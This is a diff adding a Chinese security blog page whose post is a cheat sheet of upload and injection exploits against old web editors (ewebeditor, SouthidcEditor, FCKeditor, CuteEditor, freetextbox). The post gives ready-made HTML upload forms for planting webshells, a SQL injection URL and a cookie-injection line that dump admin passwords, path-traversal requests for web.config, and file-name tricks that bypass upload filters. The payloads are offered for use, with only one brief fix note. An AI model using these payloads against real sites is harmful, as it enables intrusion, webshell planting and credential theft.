@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Web安全,漏洞,上传漏洞,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="编辑器上传相关 http://lovexiaofeng.cn/2016/07/27/19/   常见编辑器： ewebeditor SouthidcEditor fckeditor CuteEditor freetextbox">
+<meta name="keywords" content="Web安全,漏洞,上传漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="编辑器上传漏洞">
+<meta property="og:url" content="http://21guns.top/2018/01/22/编辑器上传漏洞/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="编辑器上传相关 http://lovexiaofeng.cn/2016/07/27/19/   常见编辑器： ewebeditor SouthidcEditor fckeditor CuteEditor freetextbox">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-18T07:39:23.493Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="编辑器上传漏洞">
+<meta name="twitter:description" content="编辑器上传相关 http://lovexiaofeng.cn/2016/07/27/19/   常见编辑器： ewebeditor SouthidcEditor fckeditor CuteEditor freetextbox">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2018/01/22/编辑器上传漏洞/">
+
+
+
+
+
+  <title>编辑器上传漏洞 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2018/01/22/编辑器上传漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">编辑器上传漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T15:08:09+08:00">
+                2018-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全基础/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全基础</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="编辑器上传相关"><a href="#编辑器上传相关" class="headerlink" title="编辑器上传相关"></a>编辑器上传相关</h1><blockquote>
+<p><a href="http://lovexiaofeng.cn/2016/07/27/19/" target="_blank" rel="noopener">http://lovexiaofeng.cn/2016/07/27/19/</a></p>
+</blockquote>
+<ul>
+<li>常见编辑器：<ul>
+<li>ewebeditor</li>
+<li>SouthidcEditor</li>
+<li>fckeditor</li>
+<li>CuteEditor</li>
+<li>freetextbox</li>
+</ul>
+</li>
+</ul>
+<a id="more"></a>
+<h2 id="01-ewebeditor编辑器"><a href="#01-ewebeditor编辑器" class="headerlink" title="01-ewebeditor编辑器"></a>01-ewebeditor编辑器</h2><ul>
+<li><p>默认后台:</p>
+<ul>
+<li><code>http://127.0.0.1/ewebeditor/admin_login.asp</code></li>
+<li><code>http://127.0.0.1/ewebeditor/admin/login.asp</code></li>
+</ul>
+</li>
+<li><p>默认数据库：</p>
+<ul>
+<li><code>http://127.0.0.1/ewebeditor/db/ewebeditor.mdb</code></li>
+<li><code>http://127.0.0.1/ewebeditor/db/%23ewebeditor.mdb</code></li>
+</ul>
+</li>
+<li><p>有一个版本的密码是在配置文件中</p>
+<p><a href="http://127.0.0.1/ewebeditor/admin/config.asp" target="_blank" rel="noopener">http://127.0.0.1/ewebeditor/admin/config.asp</a></p>
+</li>
+<li><p>进入编辑器，上传asa或者asp，得到webshell，也可以本地构造一个html进行上传</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">”http://127.0.0.1/ewebditor/upload.asp?action</span>=<span class="string">save&amp;type</span>=<span class="string">&amp;style</span>=<span class="string">样式名”</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">name</span>=<span class="string">myform</span> <span class="attr">enctype</span>=<span class="string">”multipart/form-data”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">uploadfile</span> <span class="attr">size</span>=<span class="string">1</span> <span class="attr">style</span>=<span class="string">”width:100%”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">”上传了”</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>利用：</p>
+<ul>
+<li>后台如果能进入</li>
+<li>可点击样式管理</li>
+</ul>
+</li>
+<li><p>standard 拷贝一份(直接修改改不了名字可以随便)<br>在拷贝的一份里加入图片类型( asa cer aaspsp )，然后点预览，在编辑器里点设计，然后直接上传asa大马，上传后，右键查看源代码就可以看到OO的位置!<br>(原理:因为在iis里 网站的属性里 应用程序配置一项 asa扩展名还是用asp.dll来解析的,asp也是,还有cer/cdx)</p>
+</li>
+</ul>
+<ul>
+<li><p>.net ewebeditor 漏洞利用</p>
+<ul>
+<li><p>默认上传地址:<br><code>http://127.0.0.1/ewebeditor/upload.aspx</code></p>
+</li>
+<li><p>直接上传一个cer的木马，在无法上传的情况下，可以地址栏构造以下代码:</p>
+<p>javascript:lbtnUpload.click();</p>
+</li>
+<li><p>然后查看源代码，找到uploadsave，找到OO地址，默认传到uploadfile这个文件夹里</p>
+</li>
+<li><p>(漏洞修补: 可以在iis里直接把upload文件夹的执行权限设置为无. )</p>
+</li>
+</ul>
+</li>
+<li><p>jsp版 ewebeditor 漏洞利用</p>
+<ul>
+<li><a href="http://127.0.0.1/ewebeditor/upload.jsp" target="_blank" rel="noopener">http://127.0.0.1/ewebeditor/upload.jsp</a></li>
+<li>说明：jsp版的没做文件过滤，直接选择个jsp马 然后回车 右键查看源代码即可</li>
+</ul>
+</li>
+<li><p>ewebeditor asp版 2.1.6 上传漏洞利用程序</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/ewebeditor/upload.asp?action=save&amp;type=IMAGE&amp;style=standard' &lt;SPAN style="</span><span class="attr">COLOR:</span> #<span class="attr">ff0000</span>"&gt;</span>and 1=2<span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span> union select S_ID,S_Name,S_Dir,S_CSS,'<span class="tag">&lt;<span class="name">SPAN</span> <span class="attr">style</span>=<span class="string">"COLOR: #ff0000"</span>&gt;</span>UploadFile'<span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span>,S_Width,S_Height,S_Memo,S_IsSys,[S_FileExt]%2b'|cer' ,S_FlashExt,[<span class="tag">&lt;<span class="name">SPAN</span> <span class="attr">style</span>=<span class="string">"COLOR: #ff0000"</span>&gt;</span>S_ImageExt]%2b'|asa',<span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span>S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data"&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">uploadfile</span> <span class="attr">size</span>=<span class="string">100</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Fuck</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="02-ewebeditor-PHP3-8-0day"><a href="#02-ewebeditor-PHP3-8-0day" class="headerlink" title="02-ewebeditor PHP3.8 0day"></a>02-ewebeditor PHP3.8 0day</h2><ul>
+<li><p>code</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/ewebeditor/asp/upload.asp?action=savetype=image&amp;style=popup&amp;cusdir=a.asp"</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">name</span>=<span class="string">myform</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">uploadfile</span> <span class="attr">size</span>=<span class="string">100</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">upload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="03-SouthidcEditor编辑器"><a href="#03-SouthidcEditor编辑器" class="headerlink" title="03-SouthidcEditor编辑器"></a>03-SouthidcEditor编辑器</h2><ul>
+<li><p>这个和ewebeditor一样 南方数据、良精系统、网软天下等程序后台都是这个编辑器</p>
+</li>
+<li><p>直接爆管理帐号密码</p>
+<p><code>http://127.0.0.1/NewsType.asp?SmallClass=&#39;%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20&#39;&#39;=&#39;</code></p>
+</li>
+<li><p>cookie注入</p>
+<p><code>http://127.0.0.1/NewsType.asp?id=XX</code></p>
+</li>
+<li><p>清空地址栏，利用union语句来注入</p>
+<p><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from Admin&quot;))</code></p>
+<p>然后在访问：/NewsType.asp 就爆出来了。</p>
+</li>
+<li><p>SouthidcEditor默认数据库</p>
+<p><code>http://127.0.0.1/southidceditor/datas/southidceditor.mdb</code></p>
+</li>
+<li><p>默认登录地址</p>
+<ul>
+<li><code>http://127.0.0.1/southidceditor/admin/admin_login.asp</code></li>
+<li><code>http://127.0.0.1/southidceditor/login.asp</code></li>
+<li>如果没有默认登陆页面 只要你登录进后台直接打开<br><code>http://127.0.0.1/admin/Southidceditor/admin_style.asp</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="04-FCKeditor"><a href="#04-FCKeditor" class="headerlink" title="04-FCKeditor"></a>04-FCKeditor</h2><ul>
+<li><p>查看编辑器版本 FCKeditor/_whatsnew.html</p>
+</li>
+<li><p>Version 2.2 版本</p>
+<p>Apache+linux 环境下在上传文件后面加个.突破！测试通过。</p>
+</li>
+<li><p>Version &lt;=2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！</p>
+<ul>
+<li><p>将以下保存为html文件，修改action地址。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"frmUpload"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span></span></span><br><span class="line"><span class="tag"><span class="attr">action</span>=<span class="string">"http://127.0.0.1/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span>Upload a new file:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"NewFile"</span> <span class="attr">size</span>=<span class="string">"50"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"btnUpload"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Upload"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>FCKeditor 文件上传“.”变“_”下划线的绕过方法</p>
+<ul>
+<li>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化。 </li>
+<li>提交shell.php+空格绕过，不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试。</li>
+<li>继续上传同名文件可变为shell.php;(1).jpg，也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制。</li>
+</ul>
+</li>
+<li><p>突破建立文件夹</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2FSilic.asp&amp;NewFolderName=z&amp;uuid=1244789975684 </span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=Silic.asp </span><br><span class="line"></span><br><span class="line">editor/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/Silic.asp&amp;NewFolderName=k.asp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆路径漏洞</p>
+<p><code>FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/Silic.asp</code></p>
+</li>
+</ul>
+<h2 id="05-CuteEditor编辑器"><a href="#05-CuteEditor编辑器" class="headerlink" title="05-CuteEditor编辑器"></a>05-CuteEditor编辑器</h2><ul>
+<li><p>方法1</p>
+<ul>
+<li><p>直接下载load.ashx配置文件</p>
+<p><code>http://127.0.0.1/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config</code></p>
+</li>
+<li><p>然后查看一些sql配置信息 从sql数据库连接入手</p>
+</li>
+<li><p>方法2</p>
+<ul>
+<li>2003 iis解析(后台拿webshell)</li>
+<li>填加新闻–上传音乐、视频等图标—新建目录xx.asp，然后上传小马1.avi，菜刀连接</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="06-freetextbox编辑器"><a href="#06-freetextbox编辑器" class="headerlink" title="06-freetextbox编辑器"></a>06-freetextbox编辑器</h2><ul>
+<li>漏洞描述：所有版本，没做登陆验证可以直接访问上传木马，FTBv3-3-1 可以直接上传任意格式的文件</li>
+<li>Freetextbox 1.6.3 及其他版本可以上传格式为：1.asp;.jpg 文件 上传后木马地址为<a href="http://127.0.0.1/images/1.asp;.jpg" target="_blank" rel="noopener">http://127.0.0.1/images/1.asp;.jpg</a></li>
+<li>漏洞文件：ftb.imagegallery.aspx</li>
+<li><a href="http://127.0.0.1/freetextbox/ftb.imagegallery.aspx?frame=1”在地址后面加上&amp;rif=..&amp;cif=." target="_blank" rel="noopener">http://127.0.0.1/freetextbox/ftb.imagegallery.aspx?frame=1”在地址后面加上&amp;rif=..&amp;cif=.</a>.</li>
+<li>再访问 整个网站的目录就呈现在眼前了,下面还有上传删除等按钮</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/漏洞/" rel="tag"># 漏洞</a>
+          
+            <a href="/tags/上传漏洞/" rel="tag"># 上传漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/22/上传及解析漏洞/" rel="next" title="上传及解析漏洞">
+                <i class="fa fa-chevron-left"></i> 上传及解析漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/22/XSS漏洞/" rel="prev" title="XSS漏洞">
+                XSS漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#编辑器上传相关"><span class="nav-text">编辑器上传相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01-ewebeditor编辑器"><span class="nav-text">01-ewebeditor编辑器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-ewebeditor-PHP3-8-0day"><span class="nav-text">02-ewebeditor PHP3.8 0day</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-SouthidcEditor编辑器"><span class="nav-text">03-SouthidcEditor编辑器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-FCKeditor"><span class="nav-text">04-FCKeditor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-CuteEditor编辑器"><span class="nav-text">05-CuteEditor编辑器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#06-freetextbox编辑器"><span class="nav-text">06-freetextbox编辑器</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
